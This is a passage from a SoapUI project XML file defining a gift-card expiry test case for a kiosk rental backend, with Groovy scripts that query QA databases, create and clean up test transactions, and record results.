3248c5b1</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>b3b7c784-7c50-42e4-b75d-8e6f746e026c</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>347bcb1b-704d-4b55-82ea-8c570a159ab9</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>09eaa7a0-2291-4d7a-84cd-5c6da1e51274</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>5a35d39d-4f88-4217-bf3a-f3cebdc33ac5</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase id="2420cb04-877f-4a40-8ead-da469e1bf5d0" discardOkResults="true" failOnError="false" failTestCaseOnErrors="true" keepSession="false" name="GiftCard-Expire" searchProperties="true" timeout="0" wsrmEnabled="false" wsrmVersion="1.0" wsrmAckTo="" amfAuthorisation="false" amfEndpoint="" amfLogin="" amfPassword="" maxResults="0"><con:settings><con:setting id="IncludeOverview">true</con:setting><con:setting id="IncludeResults">true</con:setting><con:setting id="FlowLayout">false</con:setting><con:setting id="ErrorDetails">true</con:setting><con:setting id="IncludeCoverage">true</con:setting></con:settings><con:testStep type="jdbc" name="WarmUp Script" id="3236df42-26d2-4557-8ee2-818c75cce5f1"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>Select GetDate() AS CurrentDateTime</con:query><con:properties/></con:config></con:testStep><con:testStep type="datasource" name="DataSource" id="1f2f1afc-4036-43eb-98fe-9c387a1dd8f4"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.teststeps.datasource.DataSourceContainer@prepared-properties">&lt;xml-fragment/></con:setting></con:settings><con:config xsi:type="con:DataSourceStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSource type="JDBC"><con:configuration><driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</driver><connstr>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=QaAutomation;integratedSecurity=true;</connstr><pass>t</pass><Connection>QaAutomation( QAInt )</Connection><query>Select 
	KS_GiftCard.ID As ID, 
	KS_GiftCard.Scenario As Scenario, 
	KS_GiftCard.Email As Email, 
	KS_GiftCard.CreditCardNumber As Ccnumber, 
	KS_GiftCard.CreditCardType As CCType, 
	KS_GiftCard.GCPin As GCPin, 
	KS_GiftCard.PromoCode As PromoCode,  
	KS_GiftCard.PromoValue As PromoValue, 
	KS_GiftCard.KioskID As KioskID, 
	KS_GiftCard.RentalFormats As rentalFormats, 
	KS_GiftCard.NumberOfRentals As numOfRentals, 
	KS_GiftCard.RentalVendStatus As RentalVendStatus, 
	KS_GiftCard.PurchaseFormats As PurchaseFormats, 
	KS_GiftCard.NumberOfPurchases As numOfPurchases, 
	KS_GiftCard.PurchaseVendStatus As PurchaseVendStatus, 
	KS_GiftCard.SetDaysBack As SetDaysBack, 
	KS_GiftCard.IsOffline As IsOffline, 
	KS_GiftCard.LoyaltyFlag As LoyaltyFlag
From KS_GiftCard</query><fetchSize/><stored-procedure>false</stored-procedure></con:configuration></con:dataSource><con:property>ID</con:property><con:property>Scenario</con:property><con:property>Email</con:property><con:property>Ccnumber</con:property><con:property>CCType</con:property><con:property>GCPin</con:property><con:property>PromoCode</con:property><con:property>PromoValue</con:property><con:property>KioskID</con:property><con:property>rentalFormats</con:property><con:property>numOfRentals</con:property><con:property>RentalVendStatus</con:property><con:property>PurchaseFormats</con:property><con:property>numOfPurchases</con:property><con:property>PurchaseVendStatus</con:property><con:property>SetDaysBack</con:property><con:property>IsOffline</con:property><con:property>LoyaltyFlag</con:property><con:completeLastOperation>true</con:completeLastOperation><con:restartOnRun>true</con:restartOnRun></con:config></con:testStep><con:testStep type="groovy" name="Get Data" id="a1cd3738-c812-4c00-abda-facba4c7a8a3"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def ScenarioNo =  context.expand( '${DataSource#ID}' );
testRunner.testCase.setPropertyValue("ScenarioNo", ScenarioNo.toString())
log.info ("--------------------------------" + context.testCase.name + "------------------------------");
log.info ("Scenario [$ScenarioNo]:Kiosk " + context.expand( '${DataSource#Scenario}' ));
log.info ("------------------------------START----------------------------------");

//Get Data from Data Source
def ccNumber = context.expand( '${DataSource#Ccnumber}' );
def kioskID = context.expand( '${DataSource#KioskID}' );
def UseCredits = '0'; //Default to ); since credits will be disabled after Loyality is ON
def IsOffline = context.expand( '${DataSource#IsOffline}' );
def GCPin = context.expand( '${DataSource#GCPin}' );

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

//Get TaxRate for the Kiosk.
def taxDetails = sql.firstRow("Select Sales_Tax_Rate, PurchaseTaxRate, DigitalPurchaseTaxRate, ServiceFeeTaxRate,ServiceFee  from KioskClient Where KioskClient_Id = $kioskID");
def rentalTaxRate = (taxDetails.Sales_Tax_Rate);
def purchaseTaxRate = (taxDetails.PurchaseTaxRate);
def digitalPurchaseTaxRate = (taxDetails.DigitalPurchaseTaxRate);
def serviceFeeTaxRate = (taxDetails.ServiceFeeTaxRate)!= null ? (taxDetails.ServiceFeeTaxRate) : "0.0000";
def serviceFeeAmount = (taxDetails.ServiceFee)!= null ? (taxDetails.ServiceFee) : "0.0000";

log.info ("KioskID:$kioskID; RentalTaxRate:$rentalTaxRate; PurchaseTaxRate:$purchaseTaxRate; DigitalPurchaseTaxRate:$digitalPurchaseTaxRate; ServiceFeeTaxRate:$serviceFeeTaxRate");
//Save Tax Rate at property level
testRunner.testCase.setPropertyValue('RentalTaxRate',rentalTaxRate.toString());
testRunner.testCase.setPropertyValue('PurchaseTaxRate',purchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('DigitalPurchaseTaxRate',digitalPurchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('ServiceFeeTaxRate',serviceFeeTaxRate.toString());
testRunner.testCase.setPropertyValue('ServiceFeeAmount',serviceFeeAmount.toString());

//Get Encrypted CC Info using Merchant Service method.
def encryptCC = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Generate Encrypted CCInfo"];
encryptCC.setPropertyValue("CardNumber", ccNumber);
encryptCC.setPropertyValue("KeyID", context.expand( '${#Project#KeyId}' ));

def ccrunner = encryptCC.run( null, false );	
// show that it worked out ok
log.info("Status: $ccrunner.status, time taken for TestCase was: $ccrunner.timeTaken ms");
// assert that it didn't fail
assert ccrunner.status != Status.FAILED : ccrunner.reason


//Get CustomerProfile Info.
def getCP = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Get Customer Info From Encrypted CC"];
getCP.setPropertyValue("CardHashId",encryptCC.getPropertyValue("CardID"));
def getCPrunner = getCP.run( null, false );	
// show that it worked out ok
log.info("Status: $getCPrunner.status, time taken for TestCase was: $getCPrunner.timeTaken ms");
// assert that it didn't fail
assert getCPrunner.status != Status.FAILED : getCPrunner.reason

//Get CustomerProfileNumber
def CustomerProfileNumber = getCP.getPropertyValue("CpCustomerNumber");
testRunner.testCase.setPropertyValue("CustomerProfileNumber",CustomerProfileNumber);
def CustomerID = getCP.getPropertyValue("CustomerId");
def CardAccountID = getCP.getPropertyValue("CardAccountId");
//Deleting the records from CustomerDisc to avoid below error
//Found an existing CustomerDisc record for disc: XXXXX, matching customer: XXXXXX!  Echo message, rolling back reconcile
log.info("Number of customerdisc records deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in ($CustomerID)"));

//Clear Open Rental and Reservations
def runCleanCustomer = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Cleanup Open Transactions"];
runCleanCustomer.setPropertyValue("CustomerId",CustomerID);
runCleanCustomer.setPropertyValue("kioskID",kioskID);
def CleanCustomerrunner = runCleanCustomer.run( null, false );	
// show that it worked out ok
log.info("Status: $CleanCustomerrunner.status, time taken for TestCase [Cleanup Open Transactions] was: $CleanCustomerrunner.timeTaken ms");
// assert that it didn't fail
assert CleanCustomerrunner.status != Status.FAILED : CleanCustomerrunner.reason

//Create Credits.
if (CustomerProfileNumber != "" &amp;&amp; UseCredits == '2' &amp;&amp; IsOffline != "true")
{
	def generateCredits = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Set Up Credits"];
	generateCredits.setPropertyValue("CpCustomerNumber",CustomerProfileNumber);
	generateCredits.setPropertyValue("DVDCreditQty",context.expand( '${DataSource#DVDCredits}' ));
	generateCredits.setPropertyValue("MovieCreditQty",context.expand( '${DataSource#MovieCredits}' ));
	generateCredits.setPropertyValue("GameCreditQty",context.expand( '${DataSource#GameCredits}' ));

	def generateCreditsrunner = generateCredits.run( null, false );	
	// show that it worked out ok
	log.info("Status: $generateCreditsrunner.status, time taken for TestCase was: $generateCreditsrunner.timeTaken ms");
	// assert that it didn't fail
	assert generateCreditsrunner.status != Status.FAILED : generateCreditsrunner.reason

	log.info ("Successfully Created Credits");
}
else
{
	log.info ("No credits required for the testCase or CustomerProfileNumber is NULL");
}

//Reload GiftCard
def reloadTC = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["ReloadGiftCard"];

for(int j=0;j&lt;reloadTC.getPropertyCount();j++)
{
  reloadTC.getPropertyAt(j).setValue("");
}

reloadTC.setPropertyValue("CardAccountID",CardAccountID.toString());
reloadTC.setPropertyValue("CardExists",'1');
reloadTC.setPropertyValue("CardNumber",ccNumber.toString());
reloadTC.setPropertyValue("GCPin",GCPin.toString());
def reloadTCrunner = reloadTC.run( null, false );	
// show that it worked out ok
log.info("Status: $reloadTCrunner.status, time taken for TestCase [ReloadGiftCard] was: $reloadTCrunner.timeTaken ms");
// assert that it didn't fail
assert reloadTCrunner.status != Status.FAILED : reloadTCrunner.reason

</script></con:config></con:testStep><con:testStep type="groovy" name="Authorize" id="de52aa5a-d6f4-4f33-9c0c-01d2047a0021"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["GCAuthorize"];
//Cleaning up the properties; set the values to NULL before the start

for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}

tc.setPropertyValue("Email", context.expand( '${DataSource#Email}' ));
tc.setPropertyValue("CCNumber", context.expand( '${DataSource#Ccnumber}' ));
tc.setPropertyValue("CCType", context.expand( '${DataSource#CCType}' ));
tc.setPropertyValue("PromoCode", context.expand( '${DataSource#PromoCode}' ));
tc.setPropertyValue("PromoValue", context.expand( '${DataSource#PromoValue}' ));
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("rentalFormats", context.expand( '${DataSource#rentalFormats}' ));
tc.setPropertyValue("numOfRentals", context.expand( '${DataSource#numOfRentals}' ));
tc.setPropertyValue("PurchaseFormats", context.expand( '${DataSource#PurchaseFormats}' ));
tc.setPropertyValue("numOfPurchases", context.expand( '${DataSource#numOfPurchases}' ));
tc.setPropertyValue("SetDaysBack", context.expand( '${DataSource#SetDaysBack}' ));
tc.setPropertyValue("LoyaltyFlag", context.expand( '${DataSource#LoyaltyFlag}' ));
tc.setPropertyValue("UseCredits", '0');//HardCoded to 0 since it there will be no credits in future
tc.setPropertyValue("IsOffline", context.expand( '${DataSource#IsOffline}' ));
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
tc.setPropertyValue("CustomerProfileNumber", context.expand( '${#TestCase#CustomerProfileNumber}' ));
tc.setPropertyValue("EnableServiceFee", "false");
tc.setPropertyValue("ServiceFeeTaxRate", context.expand( '${#TestCase#ServiceFeeTaxRate}' ));
tc.setPropertyValue("ServiceFeeAmount", context.expand( '${#TestCase#ServiceFeeAmount}' ));
tc.setPropertyValue("HasUpsell", "false");
tc.setPropertyValue("HasOffer", "false");
tc.setPropertyValue("MDVFlag", '');
tc.setPropertyValue("MDVDiscNumber",'');

//Check how to get the disc price

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [GCAuthorize] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAIL")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","GCAuthorize $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","GCAuthorize $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="groovy" name="GenerateReferenceNumber" id="06fc4b16-ea98-4938-a65c-fa1ab201084a"><con:settings/><con:config><script>//NOTES: Disabled extra logging; no need to delete them. 
import java.util.Date
import java.util.Calendar
import java.text.DecimalFormat;
import com.eviware.soapui.model.testsuite.TestRunner.Status;
//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def rbConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def qaConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('QaAutomation');
def rbconstring = rbConObj.getConnectionString();
def qaconstring = qaConObj.getConnectionString();
//Define the Connection
def rbsql = Sql.newInstance(rbconstring);
def qasql = Sql.newInstance(qaconstring);

//Generate new sequenceNumber
def generateSequenceNumber = rbsql.call("exec [dbo].[rb_GetNextReferenceNumber]");

//Get SequenceNumber
def getSequenceNumber = qasql.firstRow("Select ReferenceNumber from QA_ReferenceNumber");
def ReferenceNumber = getSequenceNumber.ReferenceNumber.toString();
log.info ("ReferenceNumber:$ReferenceNumber");
testRunner.testCase.setPropertyValue("ReferenceNumber",ReferenceNumber.toString())

//Build SQL Query to Insert
//Get properties from Authorize test case from test suite Generic Steps (KioskService).
def authtc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["GCAuthorize"];
def TransactionID = authtc.getPropertyValue("TransactionID")
def BarcodeForTnx = authtc.getPropertyValue("BarcodeForTnx");
def tnxDetails = rbsql.firstRow("Select ProcessorTran_ID,ApprovalCode,Rent_Date as RentDate,KioskClient_ID,ProcessorDeclinedCode,Add_Verification_Res,RentalTaxRate,AuthAmount,Customer_ID,InvoiceID,GetDate() As DateTime From [Transaction] Where Transaction_ID = $TransactionID");
def ProcessorTranID = tnxDetails.ProcessorTran_ID.toString();
def ApprovalCode = tnxDetails.ApprovalCode.toString();
def KioskID = tnxDetails.KioskClient_ID.toString();
def ProcessorDeclinedCode = tnxDetails.ProcessorDeclinedCode.toString();
def AVSResponseCode = tnxDetails.Add_Verification_Res.toString();
def SalesTaxRate = tnxDetails.RentalTaxRate.toString();
def AuthAmount = tnxDetails.AuthAmount.toString();
def CustomerID = tnxDetails.Customer_ID.toString();
def InvoiceID = tnxDetails.InvoiceID.toString();
def LastDateTime = tnxDetails.DateTime.toString();
def RentDate = tnxDetails.RentDate.toString();
def Email = context.expand( '${DataSource#Email}' );

def getWebAccountInfo = rbsql.firstRow("Select WebAccountID from WebAccount Where EmailAddress = '$Email'");
def WebAccountID = getWebAccountInfo.WebAccountID.toString();

log.info ("Barcode: $BarcodeForTnx; TransactionID:$TransactionID")
log.info ("ProcessorTranID:$ProcessorTranID;ApprovalCode:$ApprovalCode;KioskID:$KioskID;ProcessorDeclinedCode:$ProcessorDeclinedCode;AVSResponseCode:$AVSResponseCode;SalesTaxRate:$SalesTaxRate;AuthAmount:$AuthAmount;CustomerID:$CustomerID;InvoiceID:$InvoiceID;LastDateTime:$LastDateTime;WebAccountID:$WebAccountID")

//Build sql Query to insert into reservation table.
sqlQuery = ""
sqlQuery += "INSERT INTO [dbo].[Reservation]"
sqlQuery += "\n"
sqlQuery += "([CardID]"
sqlQuery += "\n"
sqlQuery += ",[KioskID]"
sqlQuery += "\n"
sqlQuery += ",[BarCode]"
sqlQuery += "\n"
sqlQuery += ",[ProcessorTranID]"
sqlQuery += "\n"
sqlQuery += ",[ReferenceNumber]"
sqlQuery += "\n"
sqlQuery += ",[ProcessorLogID]"
sqlQuery += "\n"
sqlQuery += ",[ApprovalCode]"
sqlQuery += "\n"
sqlQuery += ",[ProcessorDeclinedCode]"
sqlQuery += "\n"
sqlQuery += ",[AVSResponseCode]"
sqlQuery += "\n"
sqlQuery += ",[Email_Address]"
sqlQuery += "\n"
sqlQuery += ",[DateCreated]"
sqlQuery += "\n"
sqlQuery += ",[StatusCode]"
sqlQuery += "\n"
sqlQuery += ",[FailureCode]"
sqlQuery += "\n"
sqlQuery += ",[RentedDate]"
sqlQuery += "\n"
sqlQuery += ",[SalesTaxRate]"
sqlQuery += "\n"
sqlQuery += ",[AuthAmount]"
sqlQuery += "\n"
sqlQuery += ",[LastUpdate]"
sqlQuery += "\n"
sqlQuery += ",[CustomerID]"
sqlQuery += "\n"
sqlQuery += ",[InvoiceID]"
sqlQuery += "\n"
sqlQuery += ",[Mobile]"
sqlQuery += "\n"
sqlQuery += ",[UserAgent]"
sqlQuery += "\n"
sqlQuery += ",[WebAccountID]"
sqlQuery += "\n"
sqlQuery += ",[ClientIP]"
sqlQuery += "\n"
sqlQuery += ",[OmnitureSuiteId]"
sqlQuery += "\n"
sqlQuery += ",[RedboxDeviceIdentifier])"
sqlQuery += "\n"
sqlQuery += "VALUES"
sqlQuery += "\n"
sqlQuery += "(NULL"
sqlQuery += "\n"
sqlQuery += ",\'$KioskID\'"
sqlQuery += "\n"
sqlQuery += ",\'$BarcodeForTnx\'"
sqlQuery += "\n"
sqlQuery += ",\'$ProcessorTranID\'"
sqlQuery += "\n"
sqlQuery += ",\'$ReferenceNumber\'"
sqlQuery += "\n"
sqlQuery += ",\'$TransactionID\'"
sqlQuery += "\n"
sqlQuery += ",\'$ApprovalCode\'"
sqlQuery += "\n"
sqlQuery += ",\'$ProcessorDeclinedCode\'"
sqlQuery += "\n"
sqlQuery += ",\'I4\'"
sqlQuery += "\n"
sqlQuery += ",\'$Email\'"
sqlQuery += "\n"
sqlQuery += ",\'$LastDateTime\'"
sqlQuery += "\n"
sqlQuery += ",1"
sqlQuery += "\n"
sqlQuery += ",0"
sqlQuery += "\n"
sqlQuery += ",\'$RentDate\'"
sqlQuery += "\n"
sqlQuery += ",\'$SalesTaxRate\'"
sqlQuery += "\n"
sqlQuery += ",\'$AuthAmount\'"
sqlQuery += "\n"
sqlQuery += ",\'$LastDateTime\'"
sqlQuery += "\n"
sqlQuery += ",\'$CustomerID\'"
sqlQuery += "\n"
sqlQuery += ",\'$InvoiceID\'"
sqlQuery += "\n"
sqlQuery += ",0"
sqlQuery += "\n"
sqlQuery += ",\'SoapUI-Automation\'"
sqlQuery += "\n"
sqlQuery += ",\'$WebAccountID\'"
sqlQuery += "\n"
sqlQuery += ",\'10.30.7.238\'"
sqlQuery += "\n"
sqlQuery += ",3"
sqlQuery += "\n"
sqlQuery += ",NULL"
sqlQuery += "\n"
sqlQuery += ")"

def insertReservation = rbsql.execute(sqlQuery);

def updateTransaction = rbsql.execute("Update [Transaction] Set RentalType = 3 Where Transaction_ID = $TransactionID");</script></con:config></con:testStep><con:testStep type="groovy" name="Expire" id="6e09872e-ca9b-4316-9bd8-39d76a546ade"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status

//Set properties from Data Source
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Expire"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("ReferenceNumber", context.expand( '${#TestCase#ReferenceNumber}' ));

//Get properties from Authorize test case from test suite Generic Steps (KioskService).
def authtc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["GCAuthorize"];
tc.setPropertyValue("PurchaseCount", authtc.getPropertyValue("PurchaseCount"));
tc.setPropertyValue("RentalCount", authtc.getPropertyValue("RentalCount"));
tc.setPropertyValue("CardType", authtc.getPropertyValue("CCType"));
tc.setPropertyValue("TransactionID", authtc.getPropertyValue("TransactionID"));
tc.setPropertyValue("InvoiceID", authtc.getPropertyValue("InvoiceID"));

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [Pickup] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAIL")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Expire $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Expire $tcStatus");
	testRunner.gotoStepByName("DataSource Loop"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));

	//Get Scenario Count
	testRunner.testCase.setPropertyValue("ScenarioCount", (testRunner.testCase.getPropertyValue("ScenarioCount").toShort() + 1 ).toString());
	testRunner.testCase.testSuite.project.testSuites[testRunner.testCase.testSuite.name].setPropertyValue("TotalScenarioCount", (testRunner.testCase.testSuite.project.testSuites[testRunner.testCase.testSuite.name].getPropertyValue("TotalScenarioCount").toShort() + 1 ).toString())

}</script></con:config></con:testStep><con:testStep type="datasink" name="SaveResults" id="bfe169a4-9f2b-4b2f-b1b4-1de783e71b8f"><con:settings/><con:config xsi:type="con:DataSinkStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSink type="File"><con:configuration><fileName>${projectDir}/Test_Results.txt</fileName><separator>:</separator><escape>"</escape><quote>false</quote><trim>true</trim><append>false</append><encoding>Cp1252</encoding></con:configuration></con:dataSink><con:properties><con:property><con:name>Number</con:name><con:value>${#TestCase#ScenarioNo}</con:value></con:property><con:property><con:name>Scenario</con:name><con:value>${DataSource#Scenario}</con:value></con:property><con:property><con:name>TransactionId</con:name><con:value>${#TestCase#TransactionId}</con:value></con:property><con:property><con:name>Status</con:name><con:value>${#TestCase#TestCaseStatus}</con:value></con:property><con:property><con:name>Date</con:name><con:value>${=new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date())}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="datasourceloop" name="DataSource Loop" id="2a8289ef-7e7e-4647-aaa9-bf52cb507dff"><con:settings/><con:config><dataSourceStep>DataSource</dataSourceStep><targetStep>Get Data</targetStep></con:config></con:testStep><con:setupScript>testRunner.testCase.setPropertyValue("StartTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));
log.info("/###########################START###########################/");
log.info("Test Case Name : " + context.testCase.name);
log.info("/###########################START###########################/");
//Cleanup Script
log.info("Cleaning up any open transactions from previous executions...");
import com.eviware.soapui.model.testsuite.TestRunner.Status
import groovy.json.JsonSlurper
import groovy.sql.Sql
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def rbConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def rbconstring = rbConObj.getConnectionString();
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(rbconstring);
def mssql = Sql.newInstance(msconstring);

//Disable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 0");
log.info ("Batch Job is disabled");

log.info("...cleaning up transactions");
sql.eachRow("SELECT t.transaction_id FROM [Transaction] t INNER JOIN disc_transaction dt ON t.transaction_id = dt.transaction_id WHERE t.customer_id in (19799,75692) AND dt.Transaction_Type = 1  AND t.Transaction_Status = 4 AND ((dt.DiscTransaction_Status = 2) OR ( dt.DiscTransaction_Status = 4 AND t.ChargeDate IS NOT NULL AND (ApprovalCode IS NULL OR ApprovalCode = '')))"){
//for each transaction id remove disc transaction, transaction and customer disc etc
	row ->
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM disc_transaction WHERE transaction_id = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM unplayablereturnhistory WHERE transactionid = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM [TRANSACTION] WHERE TRANSACTION_ID = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM CustomerTransaction WHERE TransactionID = ${row.Transaction_Id}"))
}


log.info("...cleaning up barcodes");
//reset the disc statuses to 'in kiosk'
log.info("Number of customer disc deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in (19799,75692)"))
//sql.executeUpdate("UPDATE disc SET physical_status = 2 Where Title_ID in (Select Title_ID from Title WHere [FormatId] = 17) and KioskClient_ID = 1505")
sql.executeUpdate("UPDATE disc SET physical_status = 2 Where KioskClient_ID = 1505")

testRunner.testCase.setPropertyValue("ScenarioCount", "0");</con:setupScript><con:tearDownScript>import groovy.json.JsonSlurper
import groovy.sql.Sql
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def mssql = Sql.newInstance(msconstring);
//Enable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 1");
log.info ("Batch Job is Enabled");
def scenarioCount = context.expand( '${#TestCase#ScenarioCount}' )

log.info("/###########################END###########################/");
log.info("Test Case Name : " + context.testCase.name + "Test Case Status : " + testRunner.getStatus());
log.info("Scenario Count : $scenarioCount");
log.info ("Time Taken: ${((testRunner.timeTaken)/1000)/60} mins");
log.info("/###########################END###########################/");
testRunner.testCase.setPropertyValue("EndTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));</con:tearDownScript><con:properties><con:property><con:name>TransactionID</con:name><con:value>1983189</con:value></con:property><con:property><con:name>InvoiceID</con:name><con:value>2149058281</con:value></con:property><con:property><con:name>CustomerProfileNumber</con:name><con:value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">75527813105188</con:value></con:property><con:property><con:name>RentalTaxRate</con:name><con:value>9.7500</con:value></con:property><con:property><con:name>PurchaseTaxRate</con:name><con:value>8.0000</con:value></con:property><con:property><con:name>DigitalPurchaseTaxRate</con:name><con:value>0.0000</con:value></con:property><con:property><con:name>ServiceFeeTaxRate</con:name><con:value>9.9500</con:value></con:property><con:property><con:name>TestCaseStatus</con:name><con:value>Expire PASS</con:value></con:property><con:property><con:name>ScenarioNo</con:name><con:value>22</con:value></con:property><con:property><con:name>StartTime</con:name><con:value>12/26/18-14:35:04.714</con:value></con:property><con:property><con:name>EndTime</con:name><con:value>12/26/18-14:35:58.837</con:value></con:property><con:property><con:name>ServiceFeeAmount</con:name><con:value>0.0900</con:value></con:property><con:property><con:name>ScenarioCount</con:name><con:value>22</con:value></con:property><con:property><con:name>ReferenceNumber</con:name><con:value>5648704</con:value></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>6873cb8c-7751-4904-9fc0-ed152c6ef0c6</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>d498c61d-c9fd-48e5-baf1-1503a4a1b824</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>275f8372-53c8-49f3-807b-3f64816f3d89</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>3b329060-a4aa-4532-9611-e37bcd9a11c3</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>f9658b22-7814-4f47-af67-f42efbd6c101</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>ef30018b-951d-43d4-95b1-5f1c3248c5b1</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>b3b7c784-7c50-42e4-b75d-8e6f746e026c